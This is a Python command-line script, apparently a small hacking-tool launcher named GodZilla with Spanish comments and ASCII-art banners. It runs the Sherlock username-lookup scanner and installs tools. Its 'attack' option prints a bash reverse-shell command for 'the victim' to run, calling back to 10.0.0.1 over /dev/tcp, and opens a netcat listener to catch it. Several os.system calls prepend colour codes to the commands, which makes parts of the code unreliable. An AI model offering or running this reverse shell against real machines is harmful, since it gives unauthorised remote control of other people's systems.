# importamos las librerías necesarias
from colorama import Fore, Back
from sys import argv
import os, sys, webbrowser

# declaramos los argumentos
para1 = argv
para2 = argv
para3 = argv

# configuramos los colores de colorama
BLACK = '\033[30m'
RED = '\033[31m'
GREEN = '\033[32m'
YELLOW = '\033[33m'
BLUE = '\033[34m'
MAGENTA = '\033[35m'
CYAN = '\033[36m'
WHITE = '\033[37m'
RESET = '\033[39m'

# hacemos las funciones principales
def sherlock():
    try:
        os.system('clear')
        title = '''
    \033[31m   ▄████████    ▄█    █▄       ▄████████    ▄████████  ▄█        ▄██████▄   ▄████████    ▄█   ▄█▄ 
    \033[31m  ███    ███   ███    ███     ███    ███   ███    ███ ███       ███    ███ ███    ███   ███ ▄███▀ 
    \033[31m  ███    █▀    ███    ███     ███    █▀    ███    ███ ███       ███    ███ ███    █▀    ███▐██▀   
    \033[31m  ███         ▄███▄▄▄▄███▄▄  ▄███▄▄▄      ▄███▄▄▄▄██▀ ███       ███    ███ ███         ▄█████▀    
    \033[31m▀███████████ ▀▀███▀▀▀▀███▀  ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   ███       ███    ███ ███        ▀▀█████▄    
    \033[31m         ███   ███    ███     ███    █▄  ▀███████████ ███       ███    ███ ███    █▄    ███▐██▄   
    \033[31m   ▄█    ███   ███    ███     ███    ███   ███    ███ ███▌    ▄ ███    ███ ███    ███   ███ ▀███▄ 
    \033[31m ▄████████▀    ███    █▀      ██████████   ███    ███ █████▄▄██  ▀██████▀  ████████▀    ███   ▀█▀ 
    \033[31m                                           ███    ███ ▀                                 ▀         
    '''
        print(title)

        print(Fore.RED + Back.RESET + '========================================================================================')
        os.system(Fore.YELLOW + Back.RESET + f'cd sherlock && cd sherlock && python3 sherlock.py {para2[2]}')
        print(Fore.RED + Back.RESET + '========================================================================================')
        print(Fore.RED + Back.RESET + '[?] Proceso finalizado con éxito.')
        print(Fore.RESET + Back.RESET)
        sys.exit()
    
    except:
        print(Fore.RED + Back.RESET + '\n[?] Saliendo...')
        print(Fore.RESET + Back.RESET)
        sys.exit()


def install():
    try:
        os.system('clear')
        title = '''
    \033[31m ▄█  ███▄▄▄▄      ▄████████     ███        ▄████████\033[34m  ▄█        ▄█          ▄████████    ▄████████ 
    \033[31m███  ███▀▀▀██▄   ███    ███ ▀█████████▄   ███    ███\033[34m ███       ███         ███    ███   ███    ███ 
    \033[31m███▌ ███   ███   ███    █▀     ▀███▀▀██   ███    ███\033[34m ███       ███         ███    █▀    ███    ███ 
    \033[31m███▌ ███   ███   ███            ███   ▀   ███    ███\033[34m ███       ███        ▄███▄▄▄      ▄███▄▄▄▄██▀ 
    \033[31m███▌ ███   ███ ▀███████████     ███     ▀███████████\033[34m ███       ███       ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   
    \033[31m███  ███   ███          ███     ███       ███    ███\033[34m ███       ███         ███    █▄  ▀███████████ 
    \033[31m███  ███   ███    ▄█    ███     ███       ███    ███\033[34m ███▌    ▄ ███▌    ▄   ███    ███   ███    ███ 
    \033[31m█▀    ▀█   █▀   ▄████████▀     ▄████▀     ███    █▀ \033[34m █████▄▄██ █████▄▄██   ██████████   ███    ███ 
    \033[31m                                                    \033[34m ▀         ▀                        ███    ███ 
    '''
        print(title)
        print(Fore.RED + Back.RESET + '========================================================================================')
        os.system(Fore.YELLOW + Back.RESET + f'sudo su && sudo apt-get update && apt-get install git -y && sudo apt-get install python3 && pip3 install colorama && pip3 install webbrowser && sudo apt-get install python3-pip && git clone https://github.com/sherlock-project/sherlock')
        print(Fore.RED + Back.RESET + '========================================================================================')
        print(Fore.RED + Back.RESET + '[?] Proceso finalizado con éxito.')
        print(Fore.RESET + Back.RESET)
        sys.exit()

    except:
        print(Fore.RED + Back.RESET + '\n[?] Saliendo...')
        print(Fore.RESET + Back.RESET)
        sys.exit()

def credits():
    try:
        os.system('clear')
        title = '''
    \033[31m ▄████████    ▄████████    ▄████████\033[34m ████████▄   ▄█      ███        ▄████████ 
    \033[31m███    ███   ███    ███   ███    ███\033[34m ███   ▀███ ███  ▀█████████▄   ███    ███ 
    \033[31m███    █▀    ███    ███   ███    █▀ \033[34m ███    ███ ███▌    ▀███▀▀██   ███    █▀  
    \033[31m███         ▄███▄▄▄▄██▀  ▄███▄▄▄    \033[34m ███    ███ ███▌     ███   ▀   ███        
    \033[31m███        ▀▀███▀▀▀▀▀   ▀▀███▀▀▀    \033[34m ███    ███ ███▌     ███     ▀███████████ 
    \033[31m███    █▄  ▀███████████   ███    █▄ \033[34m ███    ███ ███      ███              ███ 
    \033[31m███    ███   ███    ███   ███    ███\033[34m ███   ▄███ ███      ███        ▄█    ███ 
    \033[31m████████▀    ███    ███   ██████████\033[34m ████████▀  █▀      ▄████▀    ▄████████▀  
    \033[31m             ███    ███             \033[34m                                          
    '''
        print(title)
        print(Fore.RED + Back.RESET + '========================================================================================')
        options = '''
    [?] Este proyecto ha sido creado por ZombieGeek0.
    [?] GitHub: https://www.github.com/ZombieGeek0.
    [?] GitHub del proyecto: https://github.com/ZombieGeek0/GodZilla.
    [?] Version 1.0.
    '''
        print(Fore.YELLOW + Back.RESET + options)
        print(Fore.RED + Back.RESET + '========================================================================================')
        print(Fore.RED + Back.RESET + '[?] Proceso finalizado con éxito.')
        print(Fore.RESET + Back.RESET)
        sys.exit()
    
    except:
        print(Fore.RED + Back.RESET + '\n[?] Saliendo...')
        print(Fore.RESET + Back.RESET)
        sys.exit()

def shell():
    try:
        os.system('clear')
        title = '''
    \033[31m   ▄████████    ▄█    █▄   \033[34m    ▄████████  ▄█        ▄█       
    \033[31m  ███    ███   ███    ███  \033[34m   ███    ███ ███       ███       
    \033[31m  ███    █▀    ███    ███  \033[34m   ███    █▀  ███       ███       
    \033[31m  ███         ▄███▄▄▄▄███▄▄\033[34m  ▄███▄▄▄     ███       ███       
    \033[31m▀███████████ ▀▀███▀▀▀▀███▀ \033[34m ▀▀███▀▀▀     ███       ███       
    \033[31m         ███   ███    ███  \033[34m   ███    █▄  ███       ███       
    \033[31m   ▄█    ███   ███    ███  \033[34m   ███    ███ ███▌    ▄ ███▌    ▄ 
    \033[31m ▄████████▀    ███    █▀   \033[34m   ██████████ █████▄▄██ █████▄▄██ 
    \033[31m                           \033[34m              ▀         ▀         
    '''
        print(title)
        print(Fore.RED + Back.RESET + '[?] Comando a ejecutar en la víctima: bash -i >& /dev/tcp/10.0.0.1/8080 0>&1')
        print(Fore.RED + Back.RESET + '========================================================================================')
        os.system(Fore.YELLOW + Back.RESET + f'nc -lvp {para3[3]}')
        print(Fore.RED + Back.RESET + '========================================================================================')
        print(Fore.RED + Back.RESET + '[?] Proceso finalizado con éxito.')
        print(Fore.RESET + Back.RESET)
        sys.exit()

    except:
        print(Fore.RED + Back.RESET + '\n[?] Saliendo...')
        print(Fore.RESET + Back.RESET)
        sys.exit()

def helper():
    try:
        webbrowser.open('https://github.com/ZombieGeeK0/GodZilla')
        os.system('clear')
        title = '''
\033[31m   ▄█    █▄       ▄████████  ▄█      \033[34m    ▄███████▄    ▄████████    ▄████████ 
\033[31m  ███    ███     ███    ███ ███      \033[34m   ███    ███   ███    ███   ███    ███ 
\033[31m  ███    ███     ███    █▀  ███      \033[34m   ███    ███   ███    █▀    ███    ███ 
\033[31m ▄███▄▄▄▄███▄▄  ▄███▄▄▄     ███      \033[34m   ███    ███  ▄███▄▄▄      ▄███▄▄▄▄██▀ 
\033[31m▀▀███▀▀▀▀███▀  ▀▀███▀▀▀     ███      \033[34m ▀█████████▀  ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   
\033[31m  ███    ███     ███    █▄  ███      \033[34m   ███          ███    █▄  ▀███████████ 
\033[31m  ███    ███     ███    ███ ███▌    ▄\033[34m   ███          ███    ███   ███    ███ 
\033[31m  ███    █▀      ██████████ █████▄▄██\033[34m  ▄████▀        ██████████   ███    ███ 
\033[31m                            ▀        \033[34m                             ███    ███ 
'''
        print(title)
        print(Fore.RED + Back.RESET + '========================================================================================')
        options = '''
python3 godzilla.py -i   --> [Install the tools] 

python3 godzilla.py -s [username]   --> [Sherlock scanner]

python3 godzilla.py -c   --> [The credits] 

python3 godzilla.py -a -p [port]   --> [Attack with bash reverse shell]

python3 godzilla.py -h   --> [Help]
'''
        print(Fore.YELLOW + Back.RESET + options)
        print(Fore.RED + Back.RESET + '========================================================================================')
        print(Fore.RED + Back.RESET + '[?] Proceso finalizado con éxito.')
        print(Fore.RESET + Back.RESET)
        sys.exit()

    except:
        print(Fore.RED + Back.RESET + '\n[?] Saliendo...')
        print(Fore.RESET + Back.RESET)
        sys.exit()

# hacemos el menú
def menu():
    if para1[1] == '-i':
        install()

    elif para1[1] == '-s':
        sherlock()

    elif para1[1] == '-c':
        credits()

    elif para1[1] == '-a':
        shell() 

    elif para1[1] == '-h':
        helper()

    else:
        print(Fore.RED + Back.RESET + '\n[?] Error: Revisa si has incluido todos los parámetros necesarios en la petición.')
        print(Fore.RESET + Back.RESET)
        sys.exit()

menu()
